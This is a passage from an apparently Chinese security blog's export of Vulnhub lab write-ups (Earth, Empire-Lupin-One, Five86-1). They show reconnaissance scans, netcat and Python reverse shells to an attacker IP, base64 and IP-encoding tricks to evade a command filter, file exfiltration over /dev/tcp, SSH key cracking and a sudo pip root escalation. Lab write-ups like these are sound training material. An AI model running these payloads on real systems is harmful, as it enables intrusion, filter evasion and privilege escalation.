<h3 id="获取webshell"><a href="#获取webshell" class="headerlink" title="获取webshell"></a>获取webshell</h3><ul>
<li>发现命令ban掉了ip</li>
</ul>
<p><img data-src="./Earth/10.png" alt></p>
<ul>
<li>有长度限制</li>
</ul>
<p><img data-src="./Earth/11.png" alt></p>
<ul>
<li>绕过技巧</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">echo 'nc -e /bin/bash 192.168.1.82 7777' | base64</span><br><span class="line"></span><br><span class="line">echo bmMgLWUgL2Jpbi9iYXNoIDE5Mi4xNjguMS44MiA3Nzc3Cg== | base64 -d | bash</span><br></pre></td></tr></table></figure>

<ul>
<li>备注，后续看到这里的代码逻辑如下</li>
</ul>
<p><img data-src="./Earth/12.png" alt></p>
<p><img data-src="./Earth/13.png" alt></p>
<p>最开始尝试利用ip转int绕过，可惜失败了，因为靶场后台nc不支持</p>
<p>不过新的姿势也是有的</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nc -e /bin/bash 192.168.0001.82 7778</span><br><span class="line">a="192.168.";b="1.82";nc -e /bin/bash $a$b 7778</span><br><span class="line">nc -e /bin/bash 192.168.0x01.82 7778</span><br><span class="line">nc -e /bin/bash 192.168$1.1.82 7778</span><br><span class="line">...</span><br><span class="line">等等 这里就先写四种吧！</span><br></pre></td></tr></table></figure>



<p><img data-src="./Earth/14.png" alt></p>
<h3 id="提权-amp-amp-Flag"><a href="#提权-amp-amp-Flag" class="headerlink" title="提权&amp;&amp;Flag"></a>提权&amp;&amp;Flag</h3><p><img data-src="./Earth/15.png" alt></p>
<ul>
<li>这里发现异常文件<code>reset_boot</code></li>
</ul>
<p><img data-src="./Earth/16.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">netcat listener on local machine</span><br><span class="line">nc -nlvp 9002 &gt; reset_root</span><br><span class="line"></span><br><span class="line">copy the binary to netcat listener</span><br><span class="line">cat /usr/bin/reset_root &gt; /dev/tcp/192.168.1.82/9002</span><br></pre></td></tr></table></figure>

<ul>
<li>静态分析</li>
</ul>
<p><img data-src="./Earth/17.png" alt></p>
<p>参考</p>
<p><a href="https://nepcodex.com/2021/12/earth-the-planets-vulnhub-writeup/" target="_blank" rel="noopener">Earth - The Planets - Vulnhub - Writeup - Security (nepcodex.com)</a></p>
<p><img data-src="./Earth/18.png" alt></p>
<ul>
<li>get the root shell</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">bash-5.1$ touch /dev/shm/kHgTFI5G /dev/shm/Zw7bV9U5 /tmp/kcM0Wewe</span><br><span class="line">bash-5.1$ reset_root </span><br><span class="line">CHECKING IF RESET TRIGGERS PRESENT...</span><br><span class="line">RESET TRIGGERS ARE PRESENT, RESETTING ROOT PASSWORD TO: Earth</span><br><span class="line">bash-5.1$ su -l</span><br><span class="line">Password: </span><br><span class="line">[root@earth ~]# id</span><br><span class="line">uid=0(root) gid=0(root) groups=0(root)</span><br><span class="line">[root@earth ~]#</span><br></pre></td></tr></table></figure>

<p><img data-src="./Earth/19.png" alt></p>
]]></content>
      <categories>
        <category>靶场</category>
        <category>The Planets</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>The Planets</tag>
      </tags>
  </entry>
  <entry>
    <title>Empire-Lupin-One</title>
    <url>/2021/11/04/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Empire-Lupin-One/</url>
    <content><![CDATA[<h1 id="Empire-Lupin-One"><a href="#Empire-Lupin-One" class="headerlink" title="Empire-Lupin-One"></a>Empire-Lupin-One</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Empire-Lupin-One</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\napping&gt; arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:0c:29:47:5c:20, IPv4: 192.168.1.82</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.1.1     d8:c8:e9:fe:be:88       Phicomm (Shanghai) Co., Ltd.</span><br><span class="line">192.168.1.2     20:41:10:1a:04:8c       (Unknown)</span><br><span class="line">192.168.1.3     00:11:32:73:68:3b       Synology Incorporated</span><br><span class="line">192.168.1.4     00:0c:29:5a:87:06       VMware, Inc.</span><br><span class="line">192.168.1.5     00:0c:29:76:5e:9f       VMware, Inc.</span><br><span class="line">192.168.1.71    00:0c:29:8e:74:a1       VMware, Inc.</span><br><span class="line">192.168.1.72    00:0c:29:41:a1:f2       VMware, Inc.</span><br><span class="line">192.168.1.73    00:0c:29:2c:ea:f0       VMware, Inc.</span><br><span class="line">192.168.1.98    00:22:6d:62:86:81       Shenzhen GIEC Electronics Co., Ltd.</span><br><span class="line">192.168.1.109   40:31:3c:22:9c:f3       XIAOMI Electronics,CO.,LTD</span><br><span class="line">192.168.1.180   00:e0:70:d9:ab:16       DH TECHNOLOGY</span><br><span class="line">192.168.1.192   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.215   c0:e7:3e:b0:0b:5b       (Unknown)</span><br><span class="line">192.168.1.228   44:1c:a8:7f:6d:f4       Hon Hai Precision Ind. Co.,Ltd.</span><br><span class="line">192.168.1.97    38:d2:ca:db:01:69       Zhejiang Tmall Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">15 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 2.064 seconds (124.03 hosts/sec). 15 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.1.157</code></li>
<li><code>NMAP</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.1.157</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line"></span><br><span class="line">C:\root&gt; nmap -sV -A -p 1-65535 192.168.1.157</span><br><span class="line">Starting Nmap 7.91 ( https://nmap.org ) at 2021-11-04 17:13 EDT</span><br><span class="line">Nmap scan report for LupinOne.lan (192.168.1.157)</span><br><span class="line">Host is up (0.0012s latency).</span><br><span class="line">Not shown: 65533 closed ports</span><br><span class="line">PORT   STATE SERVICE VERSION</span><br><span class="line">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   3072 ed:ea:d9:d3:af:19:9c:8e:4e:0f:31:db:f2:5d:12:79 (RSA)</span><br><span class="line">|   256 bf:9f:a9:93:c5:87:21:a3:6b:6f:9e:e6:87:61:f5:19 (ECDSA)</span><br><span class="line">|_  256 ac:18:ec:cc:35:c0:51:f5:6f:47:74:c3:01:95:b4:0f (ED25519)</span><br><span class="line">80/tcp open  http    Apache httpd 2.4.48 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/~myfiles</span><br><span class="line">|_http-server-header: Apache/2.4.48 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">MAC Address: 44:1C:A8:7F:6D:F4 (Hon Hai Precision Ind.)</span><br><span class="line">No exact OS matches for host (If you know what OS is running on it, see https://nmap.org/submit/ ).</span><br><span class="line">TCP/IP fingerprint:</span><br><span class="line">OS:SCAN(V=7.91%E=4%D=11/4%OT=22%CT=1%CU=43770%PV=Y%DS=1%DC=D%G=Y%M=441CA8%T</span><br><span class="line">OS:M=61844D16%P=x86_64-pc-linux-gnu)SEQ(SP=101%GCD=1%ISR=105%TI=Z%II=I%TS=A</span><br><span class="line">OS:)OPS(O1=M5B4ST11NW7%O2=M5B4ST11NW7%O3=M5B4NNT11NW7%O4=M5B4ST11NW7%O5=M5B</span><br><span class="line">OS:4ST11NW7%O6=M5B4ST11)WIN(W1=FE88%W2=FE88%W3=FE88%W4=FE88%W5=FE88%W6=FE88</span><br><span class="line">OS:)ECN(R=Y%DF=Y%T=40%W=FAF0%O=M5B4NNSNW7%CC=Y%Q=)T1(R=Y%DF=Y%T=40%S=O%A=S+</span><br><span class="line">OS:%F=AS%RD=0%Q=)T2(R=N)T3(R=N)T4(R=Y%DF=Y%T=40%W=0%S=A%A=Z%F=R%O=%RD=0%Q=)</span><br><span class="line">OS:T5(R=N)T5(R=Y%DF=Y%T=40%W=0%S=Z%A=S+%F=AR%O=%RD=0%Q=)T6(R=N)T7(R=N)U1(R=</span><br><span class="line">OS:Y%DF=N%T=40%IPL=164%UN=0%RIPL=G%RID=G%RIPCK=G%RUCK=G%RUD=G)IE(R=Y%DFI=N%</span><br><span class="line">OS:T=40%CD=S)</span><br><span class="line"></span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   1.20 ms LupinOne.lan (192.168.1.157)</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 24.97 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">gobuster dir -u http://192.168.1.157/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root&gt; gobuster dir -u http://192.168.1.157/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x html,txt,php</span><br><span class="line">===============================================================</span><br><span class="line">Gobuster v3.1.0</span><br><span class="line">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="line">===============================================================</span><br><span class="line">[+] Url:                     http://192.168.1.157/</span><br><span class="line">[+] Method:                  GET</span><br><span class="line">[+] Threads:                 10</span><br><span class="line">[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt</span><br><span class="line">[+] Negative Status codes:   404</span><br><span class="line">[+] User Agent:              gobuster/3.1.0</span><br><span class="line">[+] Extensions:              html,txt,php</span><br><span class="line">[+] Timeout:                 10s</span><br><span class="line">===============================================================</span><br><span class="line">2021/11/04 16:50:00 Starting gobuster in directory enumeration mode</span><br><span class="line">===============================================================</span><br><span class="line">/index.html           (Status: 200) [Size: 333]</span><br><span class="line">/image                (Status: 301) [Size: 314] [--&gt; http://192.168.1.157/image/]</span><br><span class="line">/manual               (Status: 301) [Size: 315] [--&gt; http://192.168.1.157/manual/]</span><br><span class="line">/javascript           (Status: 301) [Size: 319] [--&gt; http://192.168.1.157/javascript/]</span><br><span class="line">/robots.txt           (Status: 200) [Size: 34]                                        </span><br><span class="line">/server-status        (Status: 403) [Size: 278]                                       </span><br><span class="line">                                                                                      </span><br><span class="line">===============================================================</span><br><span class="line">2021/11/04 16:52:13 Finished</span><br><span class="line">===============================================================</span><br></pre></td></tr></table></figure>

<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>首页</li>
</ul>
<p><img data-src="./Empire-Lupin-One/1.png" alt></p>
<ul>
<li>一部分线索</li>
</ul>
<p><img data-src="./Empire-Lupin-One/2.png" alt></p>
<p><img data-src="./Empire-Lupin-One/3.png" alt></p>
<h3 id="xfuzz爆破"><a href="#xfuzz爆破" class="headerlink" title="xfuzz爆破"></a>xfuzz爆破</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.157/~FUZZ</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">C:\root\vulnhub\Empire-Lupin-One&gt; wfuzz -c -z file,/usr/share/wfuzz/wordlist/general/common.txt --hc 404 http://192.168.1.157/~FUZZ                                                1 ⨯</span><br><span class="line"> /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.</span><br><span class="line">********************************************************</span><br><span class="line">* Wfuzz 3.1.0 - The Web Fuzzer                         *</span><br><span class="line">********************************************************</span><br><span class="line"></span><br><span class="line">Target: http://192.168.1.157/~FUZZ</span><br><span class="line">Total requests: 951</span><br><span class="line"></span><br><span class="line">=====================================================================</span><br><span class="line">ID           Response   Lines    Word       Chars       Payload                                                                                                               </span><br><span class="line">=====================================================================</span><br><span class="line"></span><br><span class="line">000000718:   301        9 L      28 W       316 Ch      "secret"                                                                                                              </span><br><span class="line"></span><br><span class="line">Total time: 0</span><br><span class="line">Processed Requests: 951</span><br><span class="line">Filtered Requests: 950</span><br><span class="line">Requests/sec.: 0</span><br></pre></td></tr></table></figure>

<ul>
<li>发现进一步线索</li>
</ul>
<p><img data-src="./Empire-Lupin-One/4.png" alt></p>
<ul>
<li>继续<code>xfuzz</code></li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">wfuzz -c -z file,/usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://192.168.1.157/~secret/.FUZZ.txt</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">...</span><br><span class="line">000073703:   200        1 L      1 W        4689 Ch     "mysecret"                                                                                                            </span><br><span class="line">000073989:   403        9 L      28 W       278 Ch      "httpads"                                                                                                             </span><br><span class="line">000075359:   403        9 L      28 W       278 Ch      "html_parser"       </span><br><span class="line">...</span><br></pre></td></tr></table></figure>

<p><img data-src="./Empire-Lupin-One/5.png" alt></p>
<ul>
<li>解密</li>
</ul>
<p><img data-src="./Empire-Lupin-One/6.png" alt></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">-----BEGIN OPENSSH PRIVATE KEY-----</span><br><span class="line">b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jYmMAAAAGYmNyeXB0AAAAGAAAABDy33c2Fp</span><br><span class="line">PBYANne4oz3usGAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDBzHjzJcvk</span><br><span class="line">9GXiytplgT9z/mP91NqOU9QoAwop5JNxhEfm/j5KQmdj/JB7sQ1hBotONvqaAdmsK+OYL9</span><br><span class="line">H6NSb0jMbMc4soFrBinoLEkx894B/PqUTODesMEV/aK22UKegdwlJ9Arf+1Y48V86gkzS6</span><br><span class="line">xzoKn/ExVkApsdimIRvGhsv4ZMmMZEkTIoTEGz7raD7QHDEXiusWl0hkh33rQZCrFsZFT7</span><br><span class="line">J0wKgLrX2pmoMQC6o42OQJaNLBzTxCY6jU2BDQECoVuRPL7eJa0/nRfCaOrIzPfZ/NNYgu</span><br><span class="line">/Dlf1CmbXEsCVmlD71cbPqwfWKGf3hWeEr0WdQhEuTf5OyDICwUbg0dLiKz4kcskYcDzH0</span><br><span class="line">ZnaDsmjoYv2uLVLi19jrfnp/tVoLbKm39ImmV6Jubj6JmpHXewewKiv6z1nNE8mkHMpY5I</span><br><span class="line">he0cLdyv316bFI8O+3y5m3gPIhUUk78C5n0VUOPSQMsx56d+B9H2bFiI2lo18mTFawa0pf</span><br><span class="line">XdcBVXZkouX3nlZB1/Xoip71LH3kPI7U7fPsz5EyFIPWIaENsRmznbtY9ajQhbjHAjFClA</span><br><span class="line">hzXJi4LGZ6mjaGEil+9g4U7pjtEAqYv1+3x8F+zuiZsVdMr/66Ma4e6iwPLqmtzt3UiFGb</span><br><span class="line">4Ie1xaWQf7UnloKUyjLvMwBbb3gRYakBbQApoONhGoYQAAB1BkuFFctACNrlDxN180vczq</span><br><span class="line">mXXs+ofdFSDieiNhKCLdSqFDsSALaXkLX8DFDpFY236qQE1poC+LJsPHJYSpZOr0cGjtWp</span><br><span class="line">MkMcBnzD9uynCjhZ9ijaPY/vMY7mtHZNCY8SeoWAxYXToKy2cu/+pVyGQ76KYt3J0AT7wA</span><br><span class="line">2OR3aMMk0o1LoozuyvOrB3cXMHh75zBfgQyAeeD7LyYG/b7z6zGvVxZca/g572CXxXSXlb</span><br><span class="line">QOw/AR8ArhAP4SJRNkFoV2YRCe38WhQEp4R6k+34tK+kUoEaVAbwU+IchYyM8ZarSvHVpE</span><br><span class="line">vFUPiANSHCZ/b+pdKQtBzTk5/VH/Jk3QPcH69EJyx8/gRE/glQY6z6nC6uoG4AkIl+gOxZ</span><br><span class="line">0hWJJv0R1Sgrc91mBVcYwmuUPFRB5YFMHDWbYmZ0IvcZtUxRsSk2/uWDWZcW4tDskEVPft</span><br><span class="line">rqE36ftm9eJ/nWDsZoNxZbjo4cF44PTF0WU6U0UsJW6mDclDko6XSjCK4tk8vr4qQB8OLB</span><br><span class="line">QMbbCOEVOOOm9ru89e1a+FCKhEPP6LfwoBGCZMkqdOqUmastvCeUmht6a1z6nXTizommZy</span><br><span class="line">x+ltg9c9xfeO8tg1xasCel1BluIhUKwGDkLCeIEsD1HYDBXb+HjmHfwzRipn/tLuNPLNjG</span><br><span class="line">nx9LpVd7M72Fjk6lly8KUGL7z95HAtwmSgqIRlN+M5iKlB5CVafq0z59VB8vb9oMUGkCC5</span><br><span class="line">VQRfKlzvKnPk0Ae9QyPUzADy+gCuQ2HmSkJTxM6KxoZUpDCfvn08Txt0dn7CnTrFPGIcTO</span><br><span class="line">cNi2xzGu3wC7jpZvkncZN+qRB0ucd6vfJ04mcT03U5oq++uyXx8t6EKESa4LXccPGNhpfh</span><br><span class="line">nEcgvi6QBMBgQ1Ph0JSnUB7jjrkjqC1q8qRNuEcWHyHgtc75JwEo5ReLdV/hZBWPD8Zefm</span><br><span class="line">8UytFDSagEB40Ej9jbD5GoHMPBx8VJOLhQ+4/xuaairC7s9OcX4WDZeX3E0FjP9kq3QEYH</span><br><span class="line">zcixzXCpk5KnVmxPul7vNieQ2gqBjtR9BA3PqCXPeIH0OWXYE+LRnG35W6meqqQBw8gSPw</span><br><span class="line">n49YlYW3wxv1G3qxqaaoG23HT3dxKcssp+XqmSALaJIzYlpnH5Cmao4eBQ4jv7qxKRhspl</span><br><span class="line">AbbL2740eXtrhk3AIWiaw1h0DRXrm2GkvbvAEewx3sXEtPnMG4YVyVAFfgI37MUDrcLO93</span><br><span class="line">oVb4p/rHHqqPNMNwM1ns+adF7REjzFwr4/trZq0XFkrpCe5fBYH58YyfO/g8up3DMxcSSI</span><br><span class="line">63RqSbk60Z3iYiwB8iQgortZm0UsQbzLj9i1yiKQ6OekRQaEGxuiIUA1SvZoQO9NnTo0SV</span><br><span class="line">y7mHzzG17nK4lMJXqTxl08q26OzvdqevMX9b3GABVaH7fsYxoXF7eDsRSx83pjrcSd+t0+</span><br><span class="line">t/YYhQ/r2z30YfqwLas7ltoJotTcmPqII28JpX/nlpkEMcuXoLDzLvCZORo7AYd8JQrtg2</span><br><span class="line">Ays8pHGynylFMDTn13gPJTYJhLDO4H9+7dZy825mkfKnYhPnioKUFgqJK2yswQaRPLakHU</span><br><span class="line">yviNXqtxyqKc5qYQMmlF1M+fSjExEYfXbIcBhZ7gXYwalGX7uX8vk8zO5dh9W9SbO4LxlI</span><br><span class="line">8nSvezGJJWBGXZAZSiLkCVp08PeKxmKN2S1TzxqoW7VOnI3jBvKD3IpQXSsbTgz5WB07BU</span><br><span class="line">mUbxCXl1NYzXHPEAP95Ik8cMB8MOyFcElTD8BXJRBX2I6zHOh+4Qa4+oVk9ZluLBxeu22r</span><br><span class="line">VgG7l5THcjO7L4YubiXuE2P7u77obWUfeltC8wQ0jArWi26x/IUt/FP8Nq964pD7m/dPHQ</span><br><span class="line">E8/oh4V1NTGWrDsK3AbLk/MrgROSg7Ic4BS/8IwRVuC+d2w1Pq+X+zMkblEpD49IuuIazJ</span><br><span class="line">BHk3s6SyWUhJfD6u4C3N8zC3Jebl6ixeVM2vEJWZ2Vhcy+31qP80O/+Kk9NUWalsz+6Kt2</span><br><span class="line">yueBXN1LLFJNRVMvVO823rzVVOY2yXw8AVZKOqDRzgvBk1AHnS7r3lfHWEh5RyNhiEIKZ+</span><br><span class="line">wDSuOKenqc71GfvgmVOUypYTtoI527fiF/9rS3MQH2Z3l+qWMw5A1PU2BCkMso060OIE9P</span><br><span class="line">5KfF3atxbiAVii6oKfBnRhqM2s4SpWDZd8xPafktBPMgN97TzLWM6pi0NgS+fJtJPpDRL8</span><br><span class="line">vTGvFCHHVi4SgTB64+HTAH53uQC5qizj5t38in3LCWtPExGV3eiKbxuMxtDGwwSLT/DKcZ</span><br><span class="line">Qb50sQsJUxKkuMyfvDQC9wyhYnH0/4m9ahgaTwzQFfyf7DbTM0+sXKrlTYdMYGNZitKeqB</span><br><span class="line">1bsU2HpDgh3HuudIVbtXG74nZaLPTevSrZKSAOit+Qz6M2ZAuJJ5s7UElqrLliR2FAN+gB</span><br><span class="line">ECm2RqzB3Huj8mM39RitRGtIhejpsWrDkbSzVHMhTEz4tIwHgKk01BTD34ryeel/4ORlsC</span><br><span class="line">iUJ66WmRUN9EoVlkeCzQJwivI=</span><br><span class="line">-----END OPENSSH PRIVATE KEY-----</span><br></pre></td></tr></table></figure>

<h3 id="密码破解"><a href="#密码破解" class="headerlink" title="密码破解"></a>密码破解</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">python /usr/share/john/ssh2john.py id.rsa &gt; id_rsa_crack</span><br><span class="line">john --wordlist=/usr/share/wordlists/rockyou.txt id_rsa_crack</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">P@55w0rd! (id_rsa)</span><br></pre></td></tr></table></figure>

<h3 id="shell"><a href="#shell" class="headerlink" title="shell"></a>shell</h3><ul>
<li>拿到<code>shell</code></li>
</ul>
<p><img data-src="./Empire-Lupin-One/7.png" alt></p>
<p><img data-src="./Empire-Lupin-One/8.png" alt></p>
<p><img data-src="./Empire-Lupin-One/9.png" alt></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 反弹shell</span></span><br><span class="line"><span class="keyword">import</span> socket,subprocess,os</span><br><span class="line">s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)</span><br><span class="line">s.connect((<span class="string">"192.168.1.82"</span>,<span class="number">7776</span>))</span><br><span class="line">os.dup2(s.fileno(),<span class="number">0</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">1</span>)</span><br><span class="line">os.dup2(s.fileno(),<span class="number">2</span>)</span><br><span class="line"><span class="keyword">import</span> pty</span><br><span class="line">pty.spawn(<span class="string">"sh"</span>)</span><br></pre></td></tr></table></figure>

<ul>
<li>成功拿到另一个用户</li>
</ul>
<p><img data-src="./Empire-Lupin-One/10.png" alt></p>
<ul>
<li>提权<code>root</code></li>
</ul>
<p><img data-src="./Empire-Lupin-One/11.png" alt></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">TF&#x3D;$(mktemp -d)</span><br><span class="line">echo &quot;import os; os.execl(&#39;&#x2F;bin&#x2F;sh&#39;, &#39;sh&#39;, &#39;-c&#39;, &#39;sh &lt;$(tty) &gt;$(tty) 2&gt;$(tty)&#39;)&quot; &gt; $TF&#x2F;setup.py</span><br><span class="line">sudo pip install $TF</span><br></pre></td></tr></table></figure>

<p><img data-src="./Empire-Lupin-One/12.png" alt></p>
<ul>
<li>那个前期敏感信息收集多少有点扯淡，不过提权还好</li>
</ul>
]]></content>
      <categories>
        <category>靶场</category>
        <category>Empire</category>
      </categories>
      <tags>
        <tag>入门</tag>
        <tag>综合靶场测试</tag>
        <tag>Empire</tag>
      </tags>
  </entry>
  <entry>
    <title>Five86-1</title>
    <url>/2021/02/06/blog_formal/security/%E9%9D%B6%E5%9C%BA/web%E9%9D%B6%E5%9C%BA/finish/Five86-1/</url>
    <content><![CDATA[<h1 id="Five86-1"><a href="#Five86-1" class="headerlink" title="Five86-1"></a>Five86-1</h1><h2 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h2><p>​    一道boot2root的综合靶场练习</p>
<a id="more"></a>

<h2 id="基础环境"><a href="#基础环境" class="headerlink" title="基础环境"></a>基础环境</h2><ul>
<li>kali2020</li>
<li>Five86-1</li>
<li>windows10</li>
</ul>
<h2 id="测试步骤"><a href="#测试步骤" class="headerlink" title="测试步骤"></a>测试步骤</h2><h3 id="发现目标"><a href="#发现目标" class="headerlink" title="发现目标"></a>发现目标</h3><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">arp-scan -l</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# arp-scan -l</span><br><span class="line">Interface: eth0, type: EN10MB, MAC: 00:50:56:28:f2:ec, IPv4: 192.168.43.172</span><br><span class="line">Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)</span><br><span class="line">192.168.43.1    ba:73:a7:1e:be:69       (Unknown: locally administered)</span><br><span class="line">192.168.43.159  08:00:27:b7:c2:f7       PCS Systemtechnik GmbH</span><br><span class="line">192.168.43.225  20:0d:b0:30:02:d2       Shenzhen Four Seas Global Link Network Technology Co., Ltd.</span><br><span class="line"></span><br><span class="line">3 packets received by filter, 0 packets dropped by kernel</span><br><span class="line">Ending arp-scan 1.9.7: 256 hosts scanned in 1.976 seconds (129.55 hosts/sec). 3 responded</span><br></pre></td></tr></table></figure>

<ul>
<li>目标为 <code>192.168.43.159</code></li>
<li>NMAP</li>
</ul>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">nmap -sV -A -p 1-65535 192.168.43.159</span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;</span><span class="bash">&gt;&gt;</span></span><br><span class="line">root@kali:/home/caixin# nmap -sV -A -p 1-65535 192.168.43.159</span><br><span class="line">Starting Nmap 7.80 ( https://nmap.org ) at 2021-02-06 08:42 EST</span><br><span class="line">Nmap scan report for 192.168.43.159</span><br><span class="line">Host is up (0.00088s latency).</span><br><span class="line">Not shown: 65532 closed ports</span><br><span class="line">PORT      STATE SERVICE VERSION</span><br><span class="line">22/tcp    open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)</span><br><span class="line">| ssh-hostkey: </span><br><span class="line">|   2048 69:e6:3c:bf:72:f7:a0:00:f9:d9:f4:1d:68:e2:3c:bd (RSA)</span><br><span class="line">|   256 45:9e:c7:1e:9f:5b:d3:ce:fc:17:56:f2:f6:42:ab:dc (ECDSA)</span><br><span class="line">|_  256 ae:0a:9e:92:64:5f:86:20:c4:11:44:e0:58:32:e5:05 (ED25519)</span><br><span class="line">80/tcp    open  http    Apache httpd 2.4.38 ((Debian))</span><br><span class="line">| http-robots.txt: 1 disallowed entry </span><br><span class="line">|_/ona</span><br><span class="line">|_http-server-header: Apache/2.4.38 (Debian)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html).</span><br><span class="line">10000/tcp open  http    MiniServ 1.920 (Webmin httpd)</span><br><span class="line">|_http-title: Site doesn't have a title (text/html; Charset=iso-8859-1).</span><br><span class="line">MAC Address: 08:00:27:B7:C2:F7 (Oracle VirtualBox virtual NIC)</span><br><span class="line">Device type: general purpose</span><br><span class="line">Running: Linux 3.X|4.X</span><br><span class="line">OS CPE: cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:4</span><br><span class="line">OS details: Linux 3.2 - 4.9</span><br><span class="line">Network Distance: 1 hop</span><br><span class="line">Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</span><br><span class="line"></span><br><span class="line">TRACEROUTE</span><br><span class="line">HOP RTT     ADDRESS</span><br><span class="line">1   0.88 ms 192.168.43.159</span><br><span class="line"></span><br><span class="line">OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .</span><br><span class="line">Nmap done: 1 IP address (1 host up) scanned in 43.19 seconds</span><br></pre></td></tr></table></figure>

<ul>
<li>目录扫描</li>
</ul>
<p><img data-src="./Five86-1/1.png" alt></p>
<h3 id="登录web"><a href="#登录web" class="headerlink" title="登录web"></a>登录web</h3><ul>
<li>发现如下信息</li>
</ul>
<p><img data-src="./Five86-1/2.png" alt></p>
<p><img data-src="./Five86-1/3.png" alt></p>
<p><img data-src="./Five86-1/4.png" alt></p>
<p><img data-src="./Five86-1/5.png" alt></p>
<ul>
<li><code>whatweb</code></li>
</ul>
